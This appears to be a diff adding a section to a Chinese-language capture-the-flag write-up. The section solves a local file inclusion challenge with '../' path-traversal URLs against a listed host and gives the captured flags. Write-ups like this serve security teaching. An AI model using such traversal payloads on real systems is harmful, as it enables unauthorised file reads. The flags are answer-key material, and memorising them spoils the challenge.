@@ -63,3 +63,23 @@ Disallow: /secret
 解答:
 
 >BreakALLCTF{91YODwgPD58gpC4H9AeD}
+
+
+## web-5:Local File Inclusion
+
+解題步驟1:從最底層的資料夾找起
+
+>http://120.114.62.89:2003/index.php?page=flag
+
+解題步驟2:再往上層資料夾尋找
+
+>http://120.114.62.89:2003/index.php?page=../flag
+
+解題步驟3:最終在第四層資料夾找到
+
+>http://120.114.62.89:2003/index.php?page=../../../../flag
+>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web%20-5.png)
+
+解答:
+
+>BreakALLCTF{887cs9oKULT0lvtY2bVu} 
